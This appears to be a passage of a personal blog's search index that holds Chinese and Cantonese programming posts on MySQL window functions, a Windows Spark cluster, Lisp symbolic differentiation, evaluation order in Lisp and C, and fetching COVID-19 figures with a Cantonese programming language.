<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Mysql trick -- windows function. Mysql小技巧:窗口函数</title>
      <link href="/2023/08/17/mysql_over_trick/"/>
      <url>/2023/08/17/mysql_over_trick/</url>
      
        <content type="html"><![CDATA[<p>窗口函数是我最近在做数据分析时学到的小技巧, 下面就写一篇blog记录一下。。。</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>比起熟悉的 group by 操作, 窗口函数的好处就是不会不减少原表的行数, 以及使代码变得更加优雅(bushi)。  </p><p>首先来看看 mysql 窗口函数的语法格式:  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数名（[expr]） <span class="keyword">over</span> 子句</span><br><span class="line"><span class="keyword">over</span> 是关键字，用来指定函数执行的窗口范围</span><br></pre></td></tr></table></figure><p>而子句则有三类:  </p><ul><li><code>partition</code>子句：窗口按照那些字段进行分组，窗口函数在不同的分组上分别执行。</li><li><code>order by</code>子句：按照哪些字段进行排序，窗口函数将按照排序后的记录顺序进行编号。</li><li><code>frame</code>子句：定义子集的规则，通常用来作为滑动窗口使用。</li></ul><p>比如要根据班级进行分组并按年纪进行排序, 使用rank函数计算排名:  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span>,<span class="built_in">rank</span>() <span class="keyword">over</span> (<span class="keyword">partition</span> <span class="keyword">by</span> classname <span class="keyword">order</span> <span class="keyword">by</span> grade <span class="keyword">desc</span>) <span class="keyword">as</span> ranking <span class="keyword">from</span> class;</span><br></pre></td></tr></table></figure><p>比如说要操作 Logs 表连续出现次数至少3次的数字： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span></span><br><span class="line">    p <span class="keyword">as</span> (</span><br><span class="line">    <span class="keyword">select</span> id, num, </span><br><span class="line">    <span class="built_in">lead</span>(num, <span class="number">1</span>) <span class="keyword">over</span> (<span class="keyword">order</span> <span class="keyword">by</span> id) <span class="keyword">as</span> num1, <span class="comment">-- 选求num列当前行后面第1个数字</span></span><br><span class="line">    <span class="built_in">lead</span>(num, <span class="number">2</span>) <span class="keyword">over</span> (<span class="keyword">order</span> <span class="keyword">by</span> id) <span class="keyword">as</span> num2  <span class="comment">-- 选求num列当前行后面第2个数字</span></span><br><span class="line">    <span class="keyword">from</span> Logs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">distinct</span> p.num <span class="keyword">as</span> ConsecutiveNums</span><br><span class="line">        <span class="keyword">from</span> p <span class="keyword">where</span> p.num<span class="operator">=</span>p.num1 <span class="keyword">and</span> p.num1<span class="operator">=</span>p.num2;</span><br></pre></td></tr></table></figure><p>思路是使用 with 语句创建一个运用完窗口函数的临时表 p:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">| <span class="built_in">id</span> | num | num1 | num2 |</span><br><span class="line">| -- | --- | ---- | ---- |</span><br><span class="line">| 1  | 1   | 1    | 1    |</span><br><span class="line">| 2  | 1   | 1    | 2    |</span><br><span class="line">| 3  | 1   | 2    | 1    |</span><br><span class="line">| 4  | 2   | 1    | 2    |</span><br><span class="line">| 5  | 1   | 2    | 2    |</span><br><span class="line">| 6  | 2   | 2    | null |</span><br><span class="line">| 7  | 2   | null | null |</span><br></pre></td></tr></table></figure><p>当然 mysql 支持的窗口函数还有很多, 需要用到的时候就直接查 api 啦。。。</p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cluster on windows with spark. 用Spark搭建人生第一个Windows集群</title>
      <link href="/2023/07/19/spark_bug_mark1/"/>
      <url>/2023/07/19/spark_bug_mark1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>身为兼职量化交易开发者, 如果以后要处理TB级别的交易数据, 单机运行就太弱鸡了, 这时候就要上Spark集群了.  </p><p>在 Spark 上有很多集群的模式, 其中 Spark 自带就是 Standalone 模式.<br>咩系集群? 即系配置一堆电脑计算同一件任务.<br>反正公司大把电脑(肉机)…</p><p>Standalone模式将各台电脑分成两种角色 – Master(大佬) 和 Worker(马仔)<br>也就是 Master 可以给各个 Worker 分配任务, 而 Master 自己又可以揸刀劈友(运行计算), 这就形成了一股强大的算力.  </p><h1 id="Step1-设置-Master"><a href="#Step1-设置-Master" class="headerlink" title="Step1: 设置 Master"></a>Step1: 设置 Master</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-class org.apache.spark.deploy.master.Master</span><br></pre></td></tr></table></figure><p>结果会出现 <code>spark://ip:port</code> 为 Master 的地址, 设置 Worker 时需用到.</p><h1 id="Step2-设置-Worker"><a href="#Step2-设置-Worker" class="headerlink" title="Step2: 设置 Worker"></a>Step2: 设置 Worker</h1><p>在另外一台电脑上设置其为 <code>Worker</code>, 用 Master:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-class org.apache.spark.deploy.worker.Worker spark://ip:port</span><br></pre></td></tr></table></figure><h1 id="Step3-提交"><a href="#Step3-提交" class="headerlink" title="Step3: 提交"></a>Step3: 提交</h1><p>在 master 机中提交写好嘅程序:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spark-submit --master spark://ip:port examples/src/main/python/pi.py 1000</span><br></pre></td></tr></table></figure><p>在 Master 机用浏览器打开 <a href="http://localhost:8080/">http://localhost:8080</a> 可以看到集群计算运行的情况</p><h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p>spark-submit 提交 python 时没有反应.<br>解决方法: 在 windows 里面要在 python 安装路径中创建python3副本(复制 python.exe 为 python3.exe)</p>]]></content>
      
      
      
        <tags>
            
            <tag> data </tag>
            
            <tag> spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Create a derivation program in lisp. 用 Lisp 写个求导程序</title>
      <link href="/2023/03/17/derivation_program_in_lisp/"/>
      <url>/2023/03/17/derivation_program_in_lisp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记得之前看tensorflow, numpy等库的api中提供了自动求导的函数, 觉得其中一定是用了某些高深的数值分析算法，但在 sicp书中也给了个简单的求导程序, 本质是基于求导法则的递归性质来实现的， 感觉有点意思记录一下。</p><p>我们先来看看求导法则:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dc / dx = 0</span><br><span class="line">dx / dx = 1</span><br><span class="line">d(u + v) / dx = <span class="built_in">du</span>/dx + dv/dx</span><br><span class="line">d(uv)/dx = u(dv/dx) + v(<span class="built_in">du</span>/dv)</span><br></pre></td></tr></table></figure><p>可以看到最后两条求导法则满足递归的性质, 求导的运算过程通过分解后会得到越来越小的片段，最终将产生出常量和变量, 他们的导数都是0或者1.</p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>首先我们定义谓语(返回值为bool的函数):  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">variable</span>? x) (<span class="name">symbol</span>? x)) <span class="comment">;判断是否为变量</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">same-variable</span>? v1 v2) <span class="comment">; 是否为同一变量?</span></span><br><span class="line">    (<span class="name">and</span> (<span class="name">variable</span>? v1) (<span class="name">variable</span>? v2) (<span class="name">eq</span>? v1 v2)))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">sum</span>? x) <span class="comment">; 是否为和式</span></span><br><span class="line">    (<span class="name">and</span> (<span class="name">pair</span>? x) (<span class="name">eq</span>? (<span class="name">car</span> x) &#x27;+)))</span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">product</span>? x) <span class="comment">; 是否为乘公式</span></span><br><span class="line">    (<span class="name">and</span> (<span class="name">pair</span>? x) (<span class="name">eq</span>? (<span class="name">car</span> x) &#x27;*)))</span><br></pre></td></tr></table></figure><p>然后我们需要定义出结果的构造方法:  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">make-sum</span> a1 a2) (<span class="name">list</span> &#x27;+ a1 a2)) <span class="comment">; 构造和式</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">make-product</span> a1 a2) (<span class="name">list</span> &#x27;* a1 a2)) <span class="comment">; 构造乘式</span></span><br><span class="line"></span><br><span class="line">(<span class="name">define</span> (<span class="name">addend</span> s) (<span class="name">cadr</span> s)) <span class="comment">; 获取加数</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">augend</span> s) (<span class="name">caddr</span> s)) <span class="comment">; 获取被加数</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">multiplier</span> p) (<span class="name">cadr</span> p)) <span class="comment">; 获取乘数</span></span><br><span class="line">(<span class="name">define</span> (<span class="name">multiplicand</span> p) (<span class="name">caddr</span> p)) <span class="comment">; 获取被乘数</span></span><br></pre></td></tr></table></figure><p>最后实现求导函数:  </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">deriv</span> exp var)</span><br><span class="line">    (<span class="name">cond</span> ((<span class="name">number</span>? exp ) <span class="number">0</span>)</span><br><span class="line">          ((<span class="name">variable</span>? exp)</span><br><span class="line">            (<span class="name">if</span> (<span class="name">same-variable</span>? exp var) <span class="number">1</span> <span class="number">0</span>))</span><br><span class="line">          ((<span class="name">sum</span>? exp)</span><br><span class="line">            (<span class="name">make-sum</span> (<span class="name">deriv</span> (<span class="name">addend</span> exp) var)</span><br><span class="line">                     (<span class="name">deriv</span> (<span class="name">augend</span> exp) var)))</span><br><span class="line">          ((<span class="name">product</span>? exp)</span><br><span class="line">            (<span class="name">make-sum</span></span><br><span class="line">                (<span class="name">make-product</span> (<span class="name">multiplier</span> exp)</span><br><span class="line">                         (<span class="name">deriv</span> (<span class="name">multiplicand</span> exp) var))</span><br><span class="line">                (<span class="name">make-product</span> (<span class="name">deriv</span> (<span class="name">multiplier</span> exp) var)</span><br><span class="line">                         (<span class="name">multiplicand</span> exp))</span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">          (<span class="name">else</span></span><br><span class="line">            (<span class="name">error</span> <span class="string">&quot;unknown expression type: &quot;</span> exp))</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>接下来我们可以测试一下:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; (deriv <span class="string">&#x27;(* x 3) &#x27;</span>x)</span><br><span class="line">(+ (* x 0) (* 1 3))</span><br><span class="line">&gt; (deriv <span class="string">&#x27;(+ x y) &#x27;</span>x)</span><br><span class="line">(+ 1 0)</span><br></pre></td></tr></table></figure><p>复杂D都得:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; (deriv <span class="string">&#x27;(* (* x y) (+ x 3)) &#x27;</span>x)</span><br><span class="line">(+ (* (* x y) (+ 1 0)) (* (+ (* x 0) (* 1 y)) (+ x 3)))</span><br></pre></td></tr></table></figure><p>当然, 这个求导程序还是一个朴素的实现, 还需要对结果进行化简, 但是它已经实现了最核心的部分了…  </p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dive into the programming language. 在编程语言中计算过程是如何求值的?</title>
      <link href="/2023/01/04/how_to_eval_in_computer/"/>
      <url>/2023/01/04/how_to_eval_in_computer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近准备啃一本书&lt;&lt;计算机程序的构造与解释&gt;&gt;(国内简称sicp)。仅仅看了第一章前面两节，对计算过程又有了深刻的理解。书中用的语言是lisp，当我还在抱怨为什么不用当时流行的c时，读了几页就领悟了作者的用意: 人们常说”c生万物”， 没错，不过那仅仅是在语言的实现层面上说的，但在计算过程中, 我敢肯定: <strong>lisp生万物</strong>!</p><p>那么什么是计算过程呢? 在数学的角度，也许是一个证明的过程。但是在编程的角度，其实就是在研究一个程序求值的过程。</p><p>一个程序本质上就是在求值，在求值过程中，本质上就是将所有东西转化为两种最基本的东西–数据和运算符(实际上编译器的实现就是这个过程)。</p><h1 id="代换模型"><a href="#代换模型" class="headerlink" title="代换模型"></a>代换模型</h1><p>举个非常简单的例子：我们要编写个函数计算x^2 + y^2, c语言可以这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> square(x) x * x</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">square_sum</span><span class="params">(x, y)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> square(x) + square(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如我们调用square_sum(3, 4)会发生什么? 作者在书中抽象出了代换模型这种概念: 将square_sum的参数x和y代换为3和4，接着向下求值, 最后就会变为 3 ^ 3 + 4 ^ 4了.</p><p>用lisp更能容易发现这一过程:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">define</span> (<span class="name">square</span> x) (<span class="name">*</span> x x))</span><br><span class="line">(<span class="name">define</span> (<span class="name">square_sum</span> x y) (<span class="name">+</span> (<span class="name">square</span> x) (<span class="name">square</span> y))</span><br></pre></td></tr></table></figure><p>调用后lisp后转化为:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(+ (* x x) (* y y))</span><br></pre></td></tr></table></figure><p>非常简单吧，但是这里提出一个问题了: </p><p>在调用函数时函数是先展开后求值(正则序)还是先求值后展开(应用序)呢? 首先，数学角度证明了这两种方法都能得出同样的结果。</p><h1 id="求值也有顺序之分"><a href="#求值也有顺序之分" class="headerlink" title="求值也有顺序之分"></a>求值也有顺序之分</h1><p>在lisp中， 我们先用过程抽象的方法自己定义一个if语句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(define (new-if predicate then-clause else-clause)</span><br><span class="line">  (cond (predicate then-clause)</span><br><span class="line">        (<span class="keyword">else</span> else-clause)))</span><br></pre></td></tr></table></figure><p>我们来测试一下lisp是正则序求值还是应用序求值:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(new-if <span class="comment">#t (display &quot;good&quot;) (display &quot;bad&quot;)))</span></span><br><span class="line">&gt; badgood</span><br></pre></td></tr></table></figure><p>上面的结果是 badgood, 也就是说明 lisp 会先求出函数参数中的值，在应用代换模型向下展开运算了，那么试下正常的 if 语句:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">if</span> <span class="comment">#t (display &quot;good&quot;) (display &quot;bad&quot;))</span></span><br><span class="line">&gt; good</span><br></pre></td></tr></table></figure><p>那么就说明 if 不是用函数实现的吧(当然了，if 的底层只是个指令，函数却是一个堆栈结构)!</p><p>最后得出结论: lisp 求值过程是应用序的!!!</p><p>心血来潮，测试一下 c语言是不是也是应用序求值:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">p</span><span class="params">()</span> &#123;<span class="keyword">return</span> p();&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, test(<span class="number">0</span>, p()));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先分析一下，如果 c 语言是应用序求值，那么在调用test的时候会先对参数求值, 注意到第二个参数是个死递归(没有出口的递归), 那么这个程序会一直运行没有结果。</p><p>测试了一下，果然没看到0输出!!! 看来c语言也是应用序求值! 最后再来看一下生成的汇编代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">p:</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$32, %rsp</span><br><span class="line">callp</span><br><span class="line">addq$32, %rsp</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">movl%ecx, 16(%rbp)</span><br><span class="line">movl%edx, 24(%rbp)</span><br><span class="line">cmpl$0, 16(%rbp)</span><br><span class="line">jne.L4</span><br><span class="line">movl$0, %eax</span><br><span class="line">jmp.L5</span><br><span class="line">.L4:</span><br><span class="line">movl24(%rbp), %eax</span><br><span class="line">.L5:</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">.LC0:</span><br><span class="line">.ascii &quot;%d\0&quot;</span><br><span class="line">.text</span><br><span class="line">.globlmain</span><br><span class="line">.defmain;.scl2;.type32;.endef</span><br><span class="line">.seh_procmain</span><br><span class="line">main:</span><br><span class="line">pushq%rbp</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">subq$32, %rsp</span><br><span class="line">call__main</span><br><span class="line">callp   ; 注意这里调用test先调用了参数中的 p</span><br><span class="line">movl%eax, %edx</span><br><span class="line">movl$0, %ecx</span><br><span class="line">calltest</span><br><span class="line">movl%eax, %edx</span><br><span class="line">leaq.LC0(%rip), %rcx</span><br><span class="line">callprintf</span><br><span class="line">movl$0, %eax</span><br><span class="line">addq$32, %rsp</span><br><span class="line">popq%rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>总结一下吧，我们先讨论了代换模型，最后又对求值顺序进行了探究。发现lisp和c都是应用序的。</p><p>那么有没有编程语言求值过程是正则序的呢? 我测试了几种常用的语言暂时还没发现。。。或许使用应用序隐藏着某种优点?</p>]]></content>
      
      
      
        <tags>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Get cvoid-19 data by Cantonese! 咩话? 用粤语编程语言获取疫情数据</title>
      <link href="/2022/04/10/cantonese/get_cvoid19_data_in_cantonese/"/>
      <url>/2022/04/10/cantonese/get_cvoid19_data_in_cantonese/</url>
      
        <content type="html"><![CDATA[<p>听闻最近广州嘅疫情又大9锅了, 作为一件番禺区嘅蛋散翻学之余仲要日日测核酸…<br>希望唔好好似深圳嘅高中噉封校2个月啦.<br>不过好耐未更新过 blog, 噉今天就教大家用<strong>粤语编程语言</strong>爬取疫情数据啦!!!<br>演示嘅效果摆咗上b站:<br><a href="https://www.bilibili.com/video/BV11Y4y1H7SD/">https://www.bilibili.com/video/BV11Y4y1H7SD/</a><br>叫翻句口号先:<br>战胜疫情, 广州加油!</p><h1 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h1><p>首先导入要用到嘅库:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使下 requests</span><br><span class="line">使下 json</span><br></pre></td></tr></table></figure><h1 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h1><p>跟住呢就系请求网页相关嘅操作喇, 因为腾讯好心地为我们提供了接口, 所以取数据就非常之简单喇:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|𠯠求| 下 -&gt; <span class="string">&quot;https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5&quot;</span> @ |网页|</span><br><span class="line">|读取json| 下 -&gt; |网页| @ |数据|</span><br><span class="line">|读取json| 下 -&gt; |身位(数据, <span class="string">&#x27;data&#x27;</span>)| @ |数据|</span><br></pre></td></tr></table></figure><p>所有嘅 json 结构都存储在呢个 “数据” 变量度, 经过提取等操作后就可以得到我地想要嘅数据!(咪想到咁复杂啦)</p><h1 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h1><p>显示下最后更新嘅时间先:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">畀我睇下 |身位(数据, <span class="string">&#x27;lastUpdateTime&#x27;</span>)| 点样先?</span><br></pre></td></tr></table></figure><p>之后通过循环等基本操作就 OK 晒:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">讲嘢: |数据| 系 |身位(数据, <span class="string">&#x27;areaTree&#x27;</span>, 0, <span class="string">&#x27;children&#x27;</span>)|</span><br><span class="line">有条仆街叫 |地区|</span><br><span class="line">|i| 从 1 行到 |数据 嘅长度|</span><br><span class="line">    如果 |<span class="string">&quot;广东&quot;</span> 喺 身位(数据[i], <span class="string">&#x27;name&#x27;</span>)| 嘅话 -&gt; &#123;</span><br><span class="line">        |item| 从 1 行到 |身位(数据[i], <span class="string">&#x27;children&#x27;</span>) 嘅长度|</span><br><span class="line">            畀我睇下 |<span class="string">&quot;-----------------------------&quot;</span>| 点样先?</span><br><span class="line">            畀我睇下 |<span class="string">&quot;地区:&quot;</span>| 点样先?</span><br><span class="line">            顶你 -&gt; |地区|: |身位(数据, item, <span class="string">&#x27;name&#x27;</span>)|</span><br><span class="line">            畀我睇下 |身位(数据, item, <span class="string">&#x27;name&#x27;</span>)| 点样先？</span><br><span class="line">            畀我睇下 |<span class="string">&quot;确诊人数:&quot;</span>| 点样先?</span><br><span class="line">            顶你 -&gt; |地区|: |身位(数据, item, <span class="string">&#x27;total&#x27;</span>, <span class="string">&#x27;confirm&#x27;</span>)|</span><br><span class="line">            畀我睇下 |身位(数据, item, <span class="string">&#x27;total&#x27;</span>, <span class="string">&#x27;confirm&#x27;</span>)| 点样先?</span><br><span class="line">            畀我睇下 |<span class="string">&quot;新增确诊:&quot;</span>| 点样先?</span><br><span class="line">            顶你 -&gt; |地区|: |身位(数据, item, <span class="string">&#x27;today&#x27;</span>, <span class="string">&#x27;confirm&#x27;</span>)|</span><br><span class="line">            畀我睇下 |身位(数据, item, <span class="string">&#x27;today&#x27;</span>, <span class="string">&#x27;confirm&#x27;</span>)| 点样先?</span><br><span class="line">        行晒</span><br><span class="line">    &#125;</span><br><span class="line">行晒</span><br></pre></td></tr></table></figure><h1 id="搞掂"><a href="#搞掂" class="headerlink" title="搞掂"></a>搞掂</h1><p>所有代码:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">使下 requests</span><br><span class="line">使下 json</span><br><span class="line"></span><br><span class="line">|𠯠求| 下 -&gt; &quot;https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5&quot; @ |网页|</span><br><span class="line">|读取json| 下 -&gt; |网页| @ |数据|</span><br><span class="line">|读取json| 下 -&gt; |身位(数据, &#x27;data&#x27;)| @ |数据|</span><br><span class="line"></span><br><span class="line">畀我睇下 |身位(数据, &#x27;lastUpdateTime&#x27;)| 点样先?</span><br><span class="line">讲嘢: |数据| 系 |身位(数据, &#x27;areaTree&#x27;, 0, &#x27;children&#x27;)|</span><br><span class="line">有条仆街叫 |地区|</span><br><span class="line">|i| 从 1 行到 |数据 嘅长度|</span><br><span class="line">    如果 |&quot;广东&quot; 喺 身位(数据[i], &#x27;name&#x27;)| 嘅话 -&gt; &#123;</span><br><span class="line">        |item| 从 1 行到 |身位(数据[i], &#x27;children&#x27;) 嘅长度|</span><br><span class="line">            畀我睇下 |&quot;-----------------------------&quot;| 点样先?</span><br><span class="line">            畀我睇下 |&quot;地区:&quot;| 点样先?</span><br><span class="line">            顶你 -&gt; |地区|: |身位(数据, item, &#x27;name&#x27;)|</span><br><span class="line">            畀我睇下 |身位(数据, item, &#x27;name&#x27;)| 点样先？</span><br><span class="line">            畀我睇下 |&quot;确诊人数:&quot;| 点样先?</span><br><span class="line">            顶你 -&gt; |地区|: |身位(数据, item, &#x27;total&#x27;, &#x27;confirm&#x27;)|</span><br><span class="line">            畀我睇下 |身位(数据, item, &#x27;total&#x27;, &#x27;confirm&#x27;)| 点样先?</span><br><span class="line">            畀我睇下 |&quot;新增确诊:&quot;| 点样先?</span><br><span class="line">            顶你 -&gt; |地区|: |身位(数据, item, &#x27;today&#x27;, &#x27;confirm&#x27;)|</span><br><span class="line">            畀我睇下 |身位(数据, item, &#x27;today&#x27;, &#x27;confirm&#x27;)| 点样先?</span><br><span class="line">        行晒</span><br><span class="line">    &#125;</span><br><span class="line">行晒</span><br></pre></td></tr></table></figure><p>点解代码咁短架?<br>好简单, 因为我嘅粤语编程语言语法设计得好咯!<br>其实系因为过12点要训觉喇, 